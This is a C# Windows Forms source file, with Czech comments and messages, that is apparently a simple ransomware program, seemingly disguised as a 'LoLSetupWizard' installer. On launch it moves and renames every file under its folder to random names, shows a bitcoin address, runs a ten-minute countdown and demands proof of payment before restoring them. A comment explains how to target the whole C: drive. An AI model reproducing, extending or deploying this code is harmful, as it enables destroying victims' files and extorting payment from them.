using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace rw2
{
    public partial class Form1 : Form
    {
        public int minutes = 10, seconds = 0, milisec = 0;
        Random rnd = new Random();
        public Form1()
        {
            InitializeComponent();
        }
        string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        string btcAddress;
        public string getRandomString(int minLength, int maxLength)
        {
            Random rnd = new Random();
            string str = string.Empty;
            int length = rnd.Next(minLength, maxLength+1);
            for(int i = 0; i < length; i++)
            {
                str += alphabet[rnd.Next(0, 26)];
            }
            return str;
        }
        public char getCryptedCharacter(string password, char givenChar)
        {
            if(givenChar == '.')
            {
                return givenChar;
            }
            return alphabet[rnd.Next(0,alphabet.Length)];
        }
        public string getCryptedString(string password, string str)
        {
            string vys = string.Empty;
            foreach(char character in str)
            {
                vys += getCryptedCharacter(password, character);
            }
            return vys;
        }
         
        List<string> fileNames = new List<string>();
        List<string> filePathsBefore = new List<string>(); 
        List<string> filePathsAfter = new List<string>();  
        public void encrypce()
        {
            
            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
            //Pokud chces sifrovat cely disk tak vymen filePath za "C:"
            
            filePathsBefore = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories).ToList();
            filePathsBefore.RemoveAll(x => x.Contains("LoLSetupWizard"));
            //a pridej
            //filePathsBefore.RemoveAll(x => x.Contains(".exe");
            //filePathsBefore.RemoveAll(x => x.Contains(".sys");
            //filePathsBefore.RemoveAll(x => x.Contains(".dll");
            //tyhle soubory jsou vetsinou dulezite na chod pocitace
            foreach (string file in filePathsBefore)
            {
                if (file.Contains(@"\")) 
                {
                    string newFile = file;
                    int lengthOfPrefix = file.LastIndexOf('\\');
                    newFile = newFile.Substring(lengthOfPrefix+1);
                    fileNames.Add(newFile);
                    try 
                    { 
                        File.Move(file, newFile);
                    } catch(Exception ex)
                    {
                        newFile = newFile + getRandomString(5, 7);
                        File.Move(file, newFile);
                    }
                }
            }

            
            foreach (string file in fileNames)
            {
                string password = getRandomString(20, 25);
                string cryptedFilePosition = getCryptedString(password, file);
                try
                {
                    File.Move(file, cryptedFilePosition);
                } catch(Exception ex)
                {
                    password = getRandomString(20, 25);
                    cryptedFilePosition = cryptedFilePosition = getCryptedString(password, file);
                    File.Move(file, cryptedFilePosition);
                }
                filePathsAfter.Add(cryptedFilePosition);
            }
        }
        public void dekrypce()
        { 
            for(int i = 0; i!= filePathsAfter.Count;i++)
            {
                File.Move(filePathsAfter[i], filePathsBefore[i]);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            LoLSetupWizard.Form2 f2 = new LoLSetupWizard.Form2();
            f2.Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Text = "1FfmbHfnpaZjKFvyi1okTjJJusN455paPH";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox1.Visible = false;
            button2.Visible = false;
            MessageBox.Show("Pokud si doopravdy zaplatil, tak přepiš bitcoinovou adresu na kterou si to poslal do nově zobrazeného políčka :-)", "GL");
            textBox2.Visible = true;
            button4.Visible = true;
        }
        int triesLeft = 3;
        private void button4_Click(object sender, EventArgs e)
        {
            if(textBox2.Text == btcAddress) { dekrypce(); Hide(); MessageBox.Show("Děkuji za spolupráci :-D"); Application.Exit(); }
            else 
            {
                textBox2.Text = String.Empty;
                if(triesLeft == 0)
                {
                    MessageBox.Show("Využil si všechny svoje šance... :-(");
                    Application.Exit();
                }
                MessageBox.Show("Špatně, máš ještě " + triesLeft.ToString() + " pokusů!", "GL");
                triesLeft--;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            btcAddress = textBox1.Text;
            encrypce();
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            milisec--;
            if(milisec < 0)
            {
                seconds--;
                milisec = 99;
                if(seconds < 0)
                {
                    minutes--;
                    seconds = 59;
                    if(minutes == 0)
                    {
                        timer1.Enabled = false;
                        MessageBox.Show("Bye Bye! :-D");
                        Application.Exit();
                    }
                }
            }
            label1.Text = minutes.ToString() + ":" + seconds.ToString()+":"+milisec.ToString("D2");
        }
    }
}
